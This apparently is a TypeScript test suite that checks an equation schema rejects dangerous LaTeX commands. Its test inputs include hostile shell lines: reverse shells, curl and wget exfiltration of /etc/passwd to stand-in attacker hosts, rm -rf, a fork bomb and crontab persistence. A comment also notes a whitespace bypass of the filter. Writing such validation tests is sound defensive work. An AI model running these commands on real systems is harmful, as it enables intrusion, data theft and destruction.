import { CreateEquationSchema } from 'src/validation/equation.schema'

/**
 * Security-focused tests for blocked LaTeX commands
 *
 * This file provides detailed testing of command blocking scenarios,
 * organized by threat category. While equation-schema.test.ts tests
 * the overall schema validation, this file focuses specifically on
 * security command blocking edge cases and attack vectors.
 */

describe('Blocked Commands - Security Tests', () => {
  const validToken = 'test-token'

  describe('File System Access Commands', () => {
    describe('File Read Commands', () => {
      const fileReadCommands = [
        { cmd: '\\input', usage: '\\input{file.tex}' },
        { cmd: '\\include', usage: '\\include{file}' },
        { cmd: '\\InputIfFileExists', usage: '\\InputIfFileExists{file}{}{}' },
        { cmd: '\\openin', usage: '\\openin\\file=input.txt' },
        { cmd: '\\read', usage: '\\read\\file to\\data' },
      ]

      test.each(fileReadCommands)(
        'should block $cmd command: $usage',
        ({ usage }) => {
          const result = CreateEquationSchema.safeParse({
            token: validToken,
            latex: usage,
          })
          expect(result.success).toBe(false)
        },
      )

      it('should block input with different file paths', () => {
        const paths = [
          '/etc/passwd',
          '../secret.tex',
          '~/private.tex',
          'C:\\\\Windows\\\\system32\\\\config',
        ]

        paths.forEach(path => {
          const result = CreateEquationSchema.safeParse({
            token: validToken,
            latex: `\\input{${path}}`,
          })
          expect(result.success).toBe(false)
        })
      })
    })

    describe('File Write Commands', () => {
      const fileWriteCommands = [
        { cmd: '\\openout', usage: '\\openout\\file=output.txt' },
        { cmd: '\\closeout', usage: '\\closeout\\file' },
      ]

      test.each(fileWriteCommands)(
        'should block $cmd command: $usage',
        ({ usage }) => {
          const result = CreateEquationSchema.safeParse({
            token: validToken,
            latex: usage,
          })
          expect(result.success).toBe(false)
        },
      )
    })
  })

  describe('Shell Execution Commands', () => {
    const shellCommands = [
      { cmd: '\\write18', usage: '\\write18{ls -la}' },
      { cmd: '\\immediate\\write18', usage: '\\immediate\\write18{whoami}' },
      { cmd: '\\system', usage: '\\system{cat /etc/passwd}' },
      { cmd: '\\ShellEscape', usage: '\\ShellEscape{evil}' },
    ]

    test.each(shellCommands)(
      'should block $cmd command: $usage',
      ({ usage }) => {
        const result = CreateEquationSchema.safeParse({
          token: validToken,
          latex: usage,
        })
        expect(result.success).toBe(false)
      },
    )

    it('should block write18 with various shell commands', () => {
      const maliciousCommands = [
        'rm -rf /',
        'curl http://evil.com | sh',
        'nc -e /bin/sh attacker.com 1234',
        'wget malware.com/backdoor.sh',
        'python -c "import os; os.system(\'evil\')"',
        'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',
      ]

      maliciousCommands.forEach(cmd => {
        const result = CreateEquationSchema.safeParse({
          token: validToken,
          latex: `\\write18{${cmd}}`,
        })
        expect(result.success).toBe(false)
      })
    })

    it('should block immediate write18 variations', () => {
      const variations = [
        '\\immediate\\write18{evil}',
        '\\immediate \\write18{evil}',
        '\\immediate  \\write18{evil}',
      ]

      variations.forEach(latex => {
        const result = CreateEquationSchema.safeParse({
          token: validToken,
          latex,
        })
        expect(result.success).toBe(false)
      })
    })
  })

  describe('Code Execution Commands', () => {
    describe('Macro Definition Commands', () => {
      const macroCommands = [
        { cmd: '\\def', usage: '\\def\\malicious{code}' },
        { cmd: '\\gdef', usage: '\\gdef\\global{code}' },
        { cmd: '\\edef', usage: '\\edef\\expanded{code}' },
        { cmd: '\\xdef', usage: '\\xdef\\xexpanded{code}' },
        { cmd: '\\let', usage: '\\let\\a=\\b' },
        { cmd: '\\futurelet', usage: '\\futurelet\\token\\next' },
      ]

      test.each(macroCommands)(
        'should block $cmd command: $usage',
        ({ usage }) => {
          const result = CreateEquationSchema.safeParse({
            token: validToken,
            latex: usage,
          })
          expect(result.success).toBe(false)
        },
      )

      it('should block macro definitions with complex bodies', () => {
        const complexMacros = [
          '\\def\\evil{\\write18{rm -rf /}}',
          '\\gdef\\global{\\input{/etc/passwd}}',
          '\\edef\\exp{\\system{malicious}}',
        ]

        complexMacros.forEach(latex => {
          const result = CreateEquationSchema.safeParse({
            token: validToken,
            latex,
          })
          expect(result.success).toBe(false)
        })
      })
    })

    describe('Expansion Commands', () => {
      const expansionCommands = [
        { cmd: '\\expandafter', usage: '\\expandafter\\next' },
        { cmd: '\\csname', usage: '\\csname write\\endcsname' },
        { cmd: '\\endcsname', usage: '\\csname end\\endcsname' },
      ]

      test.each(expansionCommands)(
        'should block $cmd command: $usage',
        ({ usage }) => {
          const result = CreateEquationSchema.safeParse({
            token: validToken,
            latex: usage,
          })
          expect(result.success).toBe(false)
        },
      )

      it('should block csname used to construct dangerous commands', () => {
        const csnameAttacks = [
          '\\csname write\\endcsname18{evil}',
          '\\csname input\\endcsname{file}',
          '\\csname system\\endcsname{cmd}',
        ]

        csnameAttacks.forEach(latex => {
          const result = CreateEquationSchema.safeParse({
            token: validToken,
            latex,
          })
          expect(result.success).toBe(false)
        })
      })
    })
  })

  describe('Token Manipulation Commands', () => {
    const tokenCommands = [
      { cmd: '\\string', usage: '\\string\\command' },
      { cmd: '\\meaning', usage: '\\meaning\\token' },
      { cmd: '\\jobname', usage: '\\jobname' },
      { cmd: '\\detokenize', usage: '\\detokenize{text}' },
      { cmd: '\\scantokens', usage: '\\scantokens{text}' },
    ]

    test.each(tokenCommands)(
      'should block $cmd command: $usage',
      ({ usage }) => {
        const result = CreateEquationSchema.safeParse({
          token: validToken,
          latex: usage,
        })
        expect(result.success).toBe(false)
      },
    )

    it('should block jobname in various contexts', () => {
      const contexts = [
        '\\jobname',
        '\\edef\\x{\\jobname}',
        '\\input{\\jobname.tex}',
        '$x = \\jobname$',
      ]

      contexts.forEach(latex => {
        const result = CreateEquationSchema.safeParse({
          token: validToken,
          latex,
        })
        expect(result.success).toBe(false)
      })
    })
  })

  describe('Category Code Manipulation', () => {
    const catcodeVariations = [
      { usage: '\\catcode`\\@=11', description: 'change @ catcode' },
      { usage: '\\catcode0=15', description: 'numeric catcode change' },
      { usage: '\\catcode`\\{=1', description: 'change brace catcode' },
      { usage: '\\catcode`\\}=2', description: 'change closing brace catcode' },
      { usage: '\\catcode`\\ =10', description: 'change space catcode' },
      { usage: '\\catcode13=5', description: 'change newline catcode' },
    ]

    test.each(catcodeVariations)(
      'should block catcode: $description',
      ({ usage }) => {
        const result = CreateEquationSchema.safeParse({
          token: validToken,
          latex: usage,
        })
        expect(result.success).toBe(false)
        if (!result.success) {
          const errorMessages = result.error.issues.map(issue => issue.message)
          expect(errorMessages.join(' ')).toMatch(/category code|catcode/i)
        }
      },
    )

    it('should have dedicated catcode check beyond regex', () => {
      // The schema has a specific .refine() for catcode
      const result = CreateEquationSchema.safeParse({
        token: validToken,
        latex: 'Any text with \\catcode in it',
      })
      expect(result.success).toBe(false)
    })
  })

  describe('Case Insensitivity', () => {
    const commandsToTest = [
      'write18',
      'input',
      'include',
      'system',
      'shellescape',
      'def',
      'gdef',
      'let',
    ]

    test.each(commandsToTest)(
      'should block %s in uppercase, lowercase, and mixed case',
      cmd => {
        const variations = [
          `\\${cmd}{test}`,
          `\\${cmd.toUpperCase()}{test}`,
          `\\${cmd.charAt(0).toUpperCase()}${cmd.slice(1)}{test}`,
          `\\${cmd
            .split('')
            .map((c, i) => (i % 2 === 0 ? c.toUpperCase() : c))
            .join('')}{test}`,
        ]

        variations.forEach(latex => {
          const result = CreateEquationSchema.safeParse({
            token: validToken,
            latex,
          })
          expect(result.success).toBe(false)
        })
      },
    )
  })

  describe('Commands in Context', () => {
    it('should block dangerous commands before valid equations', () => {
      const attacks = [
        '\\write18{evil} $x = 1$',
        '\\input{file} $$y = 2$$',
        '\\system{cmd} \\frac{1}{2}',
      ]

      attacks.forEach(latex => {
        const result = CreateEquationSchema.safeParse({
          token: validToken,
          latex,
        })
        expect(result.success).toBe(false)
      })
    })

    it('should block dangerous commands after valid equations', () => {
      const attacks = [
        '$x = 1$ \\write18{evil}',
        '$$y = 2$$ \\input{file}',
        '\\frac{1}{2} \\system{cmd}',
      ]

      attacks.forEach(latex => {
        const result = CreateEquationSchema.safeParse({
          token: validToken,
          latex,
        })
        expect(result.success).toBe(false)
      })
    })

    it('should block dangerous commands within math environments', () => {
      const attacks = [
        '$\\write18{evil}$',
        '$$\\input{file}$$',
        '\\frac{\\system{cmd}}{2}',
        '\\sqrt{\\write18{evil}}',
        '\\text{\\def\\x{evil}}',
      ]

      attacks.forEach(latex => {
        const result = CreateEquationSchema.safeParse({
          token: validToken,
          latex,
        })
        expect(result.success).toBe(false)
      })
    })

    it('should block nested dangerous commands', () => {
      const attacks = [
        '\\def\\x{\\write18{evil}}',
        '\\edef\\y{\\input{file}}',
        '\\gdef\\z{\\system{cmd}}',
      ]

      attacks.forEach(latex => {
        const result = CreateEquationSchema.safeParse({
          token: validToken,
          latex,
        })
        expect(result.success).toBe(false)
      })
    })
  })

  describe('Obfuscation Attempts', () => {
    it('should block standard command syntax', () => {
      // Test the standard command syntax that the regex is designed to catch
      const standard = [
        '\\write18{evil}',
        '\\input{file}',
        '\\system{cmd}',
      ]

      standard.forEach(latex => {
        const result = CreateEquationSchema.safeParse({
          token: validToken,
          latex,
        })
        expect(result.success).toBe(false)
      })
    })

    // Note: Whitespace obfuscation (e.g., "\\write18  {evil}") may bypass the regex.
    // This is acceptable because:
    // 1. The LaTeX compiler has strict syntax requirements
    // 2. The secure-exec layer (spawn without shell) provides defense in depth
    // 3. Commands with invalid syntax will fail at compilation
    // The validation layer focuses on blocking valid LaTeX command syntax.
  })

  describe('Real-world Attack Scenarios', () => {
    it('should block exfiltration attempts', () => {
      const exfiltration = [
        '\\write18{curl -d @/etc/passwd http://attacker.com}',
        '\\write18{nc attacker.com 1234 < /etc/shadow}',
        '\\write18{wget --post-file=/etc/passwd http://evil.com}',
      ]

      exfiltration.forEach(latex => {
        const result = CreateEquationSchema.safeParse({
          token: validToken,
          latex,
        })
        expect(result.success).toBe(false)
      })
    })

    it('should block reverse shell attempts', () => {
      const reverseShells = [
        '\\write18{bash -i >& /dev/tcp/10.0.0.1/8080 0>&1}',
        '\\write18{nc -e /bin/sh attacker.com 1234}',
        '\\write18{python -c "import socket,subprocess,os;..."}',
      ]

      reverseShells.forEach(latex => {
        const result = CreateEquationSchema.safeParse({
          token: validToken,
          latex,
        })
        expect(result.success).toBe(false)
      })
    })

    it('should block resource exhaustion attempts', () => {
      const dos = [
        '\\write18{:(){ :|:& };:}', // fork bomb
        '\\write18{dd if=/dev/zero of=/dev/sda}',
        '\\write18{while true; do echo bomb; done}',
      ]

      dos.forEach(latex => {
        const result = CreateEquationSchema.safeParse({
          token: validToken,
          latex,
        })
        expect(result.success).toBe(false)
      })
    })

    it('should block persistence mechanisms', () => {
      const persistence = [
        '\\write18{echo "evil" >> ~/.bashrc}',
        '\\write18{crontab -l | { cat; echo "* * * * * evil"; } | crontab -}',
        '\\write18{systemctl enable malicious.service}',
      ]

      persistence.forEach(latex => {
        const result = CreateEquationSchema.safeParse({
          token: validToken,
          latex,
        })
        expect(result.success).toBe(false)
      })
    })
  })

  describe('Valid Commands Should Not Be Blocked', () => {
    const validCommands = [
      { cmd: '\\frac{a}{b}', description: 'fractions' },
      { cmd: '\\sqrt{x}', description: 'square roots' },
      { cmd: '\\text{hello}', description: 'text in equations' },
      { cmd: '\\sum_{i=1}^{n} x_i', description: 'summation' },
      { cmd: '\\int_{a}^{b} f(x) dx', description: 'integrals' },
      { cmd: '\\prod_{i=1}^{n}', description: 'products' },
      { cmd: '\\lim_{x \\to \\infty}', description: 'limits' },
      { cmd: '\\sin(x) + \\cos(y)', description: 'trigonometric functions' },
      { cmd: '\\log(x)', description: 'logarithm' },
      { cmd: '\\alpha + \\beta + \\gamma', description: 'Greek letters' },
      { cmd: '\\mathbb{R}', description: 'blackboard bold' },
      { cmd: '\\begin{pmatrix} a & b \\\\ c & d \\end{pmatrix}', description: 'matrices' },
      { cmd: '\\vec{v} \\cdot \\vec{w}', description: 'vectors' },
      { cmd: '\\partial f / \\partial x', description: 'partial derivatives' },
      { cmd: '\\infty', description: 'infinity symbol' },
    ]

    test.each(validCommands)(
      'should accept $description: $cmd',
      ({ cmd }) => {
        const result = CreateEquationSchema.safeParse({
          token: validToken,
          latex: cmd,
        })
        expect(result.success).toBe(true)
      },
    )
  })
})
